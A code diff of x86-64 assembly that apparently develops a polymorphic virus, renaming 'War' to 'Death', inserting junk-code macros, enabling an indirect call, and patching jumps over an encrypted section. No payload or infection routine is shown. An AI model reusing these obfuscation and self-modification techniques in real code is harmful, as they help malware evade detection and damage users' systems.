@@ -1,4 +1,4 @@
-%include "war.inc"
+%include "Death.inc"
 
 BITS 64
 default rel
@@ -16,11 +16,17 @@ _start:
 	sub		rsp, 64
 	mov		rbp, rsp
 
-	lea		rax, [rel war]
+	JUNK_5
+
+
+	lea		rax, [rel Death]
 	mov		[rsp + 32], rax
 
 	lea		rax, [rel printf]
 	mov		[rsp + 40], rax
+
+	JUNK_5
+
 
 	lea	rax, [rel start_shuffle]
 	mov		[rsp + 48], rax
@@ -32,6 +38,7 @@ _start:
 
 	lea		rax, [rel _start]
 	mov		[rsp + 8], rax
+	JUNK_5
 
 
 	lea		rax, [rel _stop]
@@ -44,7 +51,9 @@ _start:
 	mov		rsi, rax
 	mov		rdi, rcx
 	xor		rdx, rdx
-	;call	[rbp]
+	call	[rbp]
+
+
 
 	;lea	rdi, [rel start_shuffle]
 	;lea	rsi, [rel end_shuffle]
@@ -54,8 +63,12 @@ _start:
 	lea	rdi, [rel encrypted_start]
 	lea	rsi, [rel _stop]
 
+	JUNK_5
+
+
 	call	patchjmp
 
+	JUNK_5
 
 
 
@@ -75,7 +88,7 @@ _start:
 %include "polymorph.s"
 %include "print_rax.s"
 %include "printf.s"
-%include "warf.s"
+%include "Deathf.s"
 ; Functions to remove!
 
 _stop:
